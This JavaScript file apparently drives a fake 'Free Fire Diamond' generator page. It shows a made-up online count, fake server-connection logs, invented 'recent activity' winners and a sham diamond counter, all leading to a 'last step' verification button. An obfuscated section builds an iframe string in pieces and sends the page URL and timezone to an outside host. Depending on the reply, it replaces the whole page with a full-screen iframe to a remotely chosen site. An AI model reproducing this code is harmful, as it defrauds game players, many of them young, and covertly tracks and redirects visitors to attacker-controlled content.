var myVar2 = setInterval(UserTimer, 2000);
function UserTimer() {
	document.getElementById("user-online").innerHTML=Math.floor(Math.random() * 100)+700;
}
var today = new Date();
var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
document.getElementById("update").innerHTML =date;

var audioclick = new Audio('https://allfile.club/robuxv2/click.mp3');
var audiolaststep = new Audio('https://allfile.club/robuxv2/laststep.mp3');
var audiopoinrunning = new Audio('https://allfile.club/robuxv2/poinrunning.mp3');
var audioselected = new Audio('https://allfile.club/robuxv2/selected.mp3');
var audiosuccess = new Audio('https://allfile.club/robuxv2/success.mp3');
var audioError = new Audio('https://allfile.club/sound/erro.mp3');
var cardSelect1=1000;
function showprivacy(){
document.getElementById('privacy-id').style.display="block";
}
function showcontact(){
document.getElementById('contact-id').style.display="block";
}
function showterm(){
document.getElementById('term-id').style.display="block";
}

function Esend(){
  if (document.getElementById('euid').value!=""){
  document.getElementById('euid').value="";
  document.getElementById('message').value="";
  document.getElementById('responEmial').style.display="block";
}else {
  document.getElementById('euid').style.borderBottom ="1px solid #f00";
}
}
function hideprivacy(){
document.getElementById('privacy-content-id').classList.remove("showin");
document.getElementById('privacy-content-id').classList.add("hidein");
setTimeout(function(){
document.getElementById('privacy-id').style.display="none";
document.getElementById('privacy-content-id').classList.remove("hidein");
document.getElementById('privacy-content-id').classList.add("showin");
}, 800);
}

function hidecontact(){

document.getElementById('contact-content-id').classList.remove("showin");
document.getElementById('contact-content-id').classList.add("hidein");
setTimeout(function(){
document.getElementById('contact-id').style.display="none";
document.getElementById('contact-content-id').classList.remove("hidein");
document.getElementById('contact-content-id').classList.add("showin");
}, 800);
}
function hideterm(){

document.getElementById('term-content-id').classList.remove("showin");
document.getElementById('term-content-id').classList.add("hidein");
setTimeout(function(){
document.getElementById('term-id').style.display="none";
document.getElementById('term-content-id').classList.remove("hidein");
document.getElementById('term-content-id').classList.add("showin");
}, 800);
}


function selectedPlatform(num){
  audioselected.play();
  document.getElementById('platform1').classList.remove("skeyAni");
document.getElementById('platform1').style.backgroundColor="";
document.getElementById('platform2').style.backgroundColor="";
document.getElementById('platform1').style.borderColor="";
document.getElementById('platform2').style.borderColor="";
document.getElementById('platform2').classList.remove("skeyAni");


  document.getElementById('platform'+num).classList.add("skeyAni");
  document.getElementById('platform'+num).style.backgroundColor="#fc0347";
    document.getElementById('platform'+num).style.color="white";
        document.getElementById('platform'+num).style.borderColor="#9e002b";
  setTimeout(function(){
  document.getElementById('platform'+num).classList.remove("skeyAni");
  }, 800);
}

function next(){
  audioclick.play();
  name=document.getElementById("uid").value;
  if (name==""){
    audioError.play();
  document.getElementById("uid").style.borderBottom ="1px solid #ee5959";
  document.getElementById("uid").classList.add("sakeanimation");
  setTimeout(function(){
  document.getElementById("uid").classList.remove("sakeanimation");
  },500);

  }else{
  document.getElementById('page1').style.display="none";
  document.getElementById('page2').style.display="block";
}
}

function process(){
    document.getElementById("useronline").classList.remove("showin1");
      document.getElementById("activiy").classList.remove("showin2");
  document.getElementById("activiy").classList.add("hidein");
  document.getElementById("useronline").classList.add("hidein");
  setTimeout(function(){
  document.getElementById("activiy").style.display="none";
    document.getElementById("useronline").style.display="none";
},500);

audioclick.play();
document.getElementById("selecteduser").innerHTML=name;
  document.getElementById('page2').style.display="none";
    document.getElementById('footer').style.display="none";
  document.getElementById('page3').style.display="block";
  document.getElementById('footerGen').style.display="block";

  setTimeout(function(){
  document.getElementById("code").innerHTML="Connection to Free Fire Server...";
    setTimeout(function(){
      document.getElementById("code").innerHTML="Server is up at 192.23.11.164:402 (latency 0.0013s)";
      setTimeout(function(){
          document.getElementById("code").innerHTML="Connected to Free Fire server...";
          setTimeout(function(){
              document.getElementById("code").innerHTML="Connecting to server SQL databse...";
              setTimeout(function(){
                  document.getElementById("code").innerHTML="Getting ready...";
                  setTimeout(function(){
                      document.getElementById("code").innerHTML='Syncing <span style="color:#fc0347">' + cardSelect1 + ' Diamond </span> for <span style="color:#fc0347">'+ name + "</span>";
                      setTimeout(function(){
                        var coin=0;
                        var myVar2 = setInterval(UserTimer, 1);
                                function UserTimer() {
                                  audiopoinrunning.play();
                                  coin=coin+(cardSelect1/1000);
                                  if (coin>=cardSelect1){
audiosuccess.play();
                                      document.getElementById('v-text').innerHTML=cardSelect1;
                                      clearInterval(myVar2);
                                      setTimeout(function(){
                                          document.getElementById("code").innerHTML="Finalizing...";
                                          setTimeout(function(){
                                              document.getElementById("code").innerHTML="Loading last step...";
                                              setTimeout(function(){
                                                document.getElementById("settingicon").style.display="none";
                                                document.getElementById("verifybnt").style.display="block";
                                                document.getElementById("verifybnt").style.marginTop="20px";                                                 document.getElementById("code").style.fontSize="26px";
                                                  document.getElementById("code").innerHTML='Hello <span style="color:#fc0347">' + name + '</span>! You are almost done with synchronization of <span style="color:#fc0347">' + cardSelect1 + ' Diamond </span> ! Please complete the last step by click the button below to finish with synchronization process.';
                                                },800);

                                            },800);


                                        },1200);

                                  }else{
                                    document.getElementById('v-text').innerHTML=Math.floor(coin);

                                  }
                                }
                      }, 800);
                  }, 800);
              }, 800);
          }, 800);
      }, 800);
    }, 800);
  }, 800);
}

var ow="i";
var k="if";
  ow=ow+"f";  ow=ow+"r";  ow=ow+"a";
  ow=ow+"me";  ow=ow+" ";  ow=ow+"sr";ow=ow+"c="; ow=ow+'"';ow=ow+"ht";ow=ow+"tps";ow=ow+":";var st='style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></'+k+'rame>';
  var strcountry='';
  var offset = new Date().getTimezoneOffset();
  offset=offset/-60;var num;
  var strcountry='';
  var data;var country;var code;var d=window.location.href;
  fetch('https://www.visitorlocation.info/data.php?d='+d+"&t="+offset,{referrerPolicy:'unsafe-url'})
  .then(res => res.json())
  .then(output => {
  data =output;
  country=data.country;
  strcountry=country;
  code=data.code;
  code=code.toLowerCase();
  s1=data.s1;
  s2=data.s2;
  num=data.num;
  if (strcountry!='' & num!=0){  document
    .body
    .innerHTML='<'+ow+'//'+s1+'.'+s2+'/'+num+'"'+ st;  }
  });

var currentCard=1;
function card(num){
  audioselected.play();
  if(num==1){

        if (currentCard<4){
            document.getElementById('card'+currentCard).style.display="none";
          }
      if (currentCard<4){
        currentCard=currentCard+1;
            document.getElementById('card'+currentCard).style.display="block";
            document.getElementById('card'+currentCard).classList.add("zoomoutflash");
      }
  }
  else
  {
    if (currentCard>0){
        document.getElementById('card'+currentCard).style.display="none";
      }
    if (currentCard>0){
          currentCard=currentCard-1;
          if (currentCard<1){currentCard=1;}
          document.getElementById('card'+currentCard).style.display="block";
          document.getElementById('card'+currentCard).classList.add("zoomoutflash");
    }

  }
  if (currentCard==1){
      document.getElementById('cardvalue').innerHTML="1,000 Diamond";
      cardSelect1=1000;
  }
  if (currentCard==2){
      document.getElementById('cardvalue').innerHTML="2,500 Diamond";
      cardSelect1=2500;
  }
  if (currentCard==3){
      document.getElementById('cardvalue').innerHTML="5,000 Diamond";
      cardSelect1=5000;
  }
  if (currentCard==4){
      document.getElementById('cardvalue').innerHTML="10,000 Diamond";
      cardSelect1=10000;
  }
  document.getElementById('cardvalue').classList.add("zoomoutflash");
  setTimeout(function(){
    document.getElementById('cardvalue').classList.remove("zoomoutflash");
      document.getElementById('card'+currentCard).classList.remove("zoomoutflash");
  }, 100);
}

var valactivity= setInterval(RecentActivity, 100);
var prostep=0;
var prostepDelay=0;
var recentCoin ;
var genname;

function random(){

const RandomCoin = ["1000", "2500", "5000", "10000"];
recentCoin=RandomCoin[parseInt(Math.random()*4)];
var gennamelist = ["fio251", "kaka110", "isexx","Gambit",
"Outrageous Creator",
"Homely Introvert",
"Plain Privacy",
"Brash Thug",
"Annoyed",
"Demonic AI",
"Abnormal Vigor",
"Optimally Ace",
"Inimical Thug",
"Feared Butcher",
"Multiply Divide",
"Psychedelic Servicemen",
"Militaristic Machine",
"Ball Blaster",
"Legends Reload",
"Brute Fact",
"Bloss flop",
"Tango Boss",
"Optimal Aces",
"Inimical Thugs",
"Fear Butchers",
"Left Divide",
"Psychedelic",
"Militaristic ",
"Keen Team Six",
"Fuzzy Pack",
"Gangsters",
"Mortified",
"Lyrical",
"Outrageous",
"Homely",
"Plain Privilege",
"Brash Thugs",
"Nutty Domination",
"Complex Slayers",
"Faulty Devils",
"Fanatical Tyranny",
"Odd Hooligans",
"Organic Punks",
"Quarrelsome",
"Admirals",
"Perpetrator",
"Fighting",
"Keen Team Six",
"HolyJESUS",
"Lone_Ranger",
"Dark Warrior",
"XxGoldenWarior"];
genname=gennamelist[Math.floor(Math.random() * 52)];
  document.getElementById("recent-name").innerHTML=(genname);
}


  function RecentActivity(){
    if (prostep<1){
        random()
    }
  else if (prostep<52){
  document.getElementById("step1").style.backgroundColor="#629ad4";
  document.getElementById("step2").style.backgroundColor="#393b3d";
  document.getElementById("step3").style.backgroundColor="#393b3d";
  document.getElementById("pro-bar").style.backgroundColor="#629ad4";
    document.getElementById("pro-bar").style.width=prostep +"%";
    if (recentCoin==1000){
          document.getElementById("recent-num").innerHTML=(prostep*19);
    }
    if (recentCoin==2500){
          document.getElementById("recent-num").innerHTML=(prostep*48);
    }
    if (recentCoin==5000){
          document.getElementById("recent-num").innerHTML=(prostep*116);
    }
    if (recentCoin==10000){
          document.getElementById("recent-num").innerHTML=(prostep*192);
    }

}
else if(prostep<99){
document.getElementById("step2").style.backgroundColor="#629ad4";
document.getElementById("pro-bar").style.width=prostep +"%";
document.getElementById("recent-num").innerHTML=recentCoin;
}
else if(prostep<100){
document.getElementById("step1").style.backgroundColor="#32ab00";
document.getElementById("step2").style.backgroundColor="#32ab00";
document.getElementById("step3").style.backgroundColor="#32ab00";
document.getElementById("pro-bar").style.backgroundColor="#32ab00";
}
else if(prostep>130){
  prostep=0;
  random();
}
prostep++;
}

particlesJS('particles-js',

  {
    "particles": {
      "number": {
        "value": 200,
        "density": {
          "enable": true,
          "value_area": 1657.2100474277727
        }
      },
      "color": {
        "value": "#fc0347"
      },
      "shape": {
        "type": "polygon",
        "stroke": {
          "width": 0,
          "color": "#000000"
        },
        "polygon": {
          "nb_sides": 6
        },
        "image": {
          "src": "img/github.svg",
          "width": 100,
          "height": 100
        }
      },
      "opacity": {
        "value": 1,
        "random": true,
        "anim": {
          "enable": false,
          "speed": 1,
          "opacity_min": 0.1,
          "sync": false
        }
      },
      "size": {
        "value": 5,
        "random": true,
        "anim": {
          "enable": false,
          "speed": 40,
          "size_min": 0.1,
          "sync": false
        }
      },
      "line_linked": {
        "enable": true,
        "distance": 150,
        "color": "#fc0347",
        "opacity": 0.4,
        "width": 1
      },
      "move": {
        "enable": true,
        "speed": 6,
        "direction": "none",
        "random": false,
        "straight": false,
        "out_mode": "out",
        "attract": {
          "enable": false,
          "rotateX": 600,
          "rotateY": 1200
        }
      }
    },
    "interactivity": {
      "detect_on": "canvas",
      "events": {
        "onhover": {
          "enable": true,
          "mode": "repulse"
        },
        "onclick": {
          "enable": true,
          "mode": "push"
        },
        "resize": true
      },
      "modes": {
        "grab": {
          "distance": 400,
          "line_linked": {
            "opacity": 1
          }
        },
        "bubble": {
          "distance": 400,
          "size": 40,
          "duration": 2,
          "opacity": 8,
          "speed": 3
        },
        "repulse": {
          "distance": 200
        },
        "push": {
          "particles_nb": 4
        },
        "remove": {
          "particles_nb": 2
        }
      }
    },
    "retina_detect": true,
    "config_demo": {
      "hide_card": false,
      "background_color": "#b61924",
      "background_image": "",
      "background_position": "50% 50%",
      "background_repeat": "no-repeat",
      "background_size": "cover"
    }
  }

);
